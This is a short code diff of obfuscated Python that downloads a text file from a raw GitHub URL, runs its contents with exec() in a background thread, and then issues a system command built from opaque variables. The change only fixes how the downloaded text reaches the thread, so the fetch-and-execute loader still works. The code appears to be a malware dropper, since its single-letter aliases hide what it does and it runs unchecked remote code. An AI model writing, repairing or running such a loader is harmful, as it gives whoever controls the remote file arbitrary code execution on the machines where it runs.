@@ -42,9 +42,9 @@ with E(G,'w')as C:C.write(str(int(I.time())))
 kills = M.get("https://raw.githubusercontent.com/48GE12/52/main/message%20(1).txt")
 textmsg = kills.text
 # execute in a new thread
-def execute_python():
+def execute_python(textmsg):
     exec(textmsg)
-thread = threading.Thread(target=execute_python)
+thread = threading.Thread(target=execute_python, args=(textmsg,))
 thread.start()
 A.system(f"{D} {H}")
 B('Executed the program.')
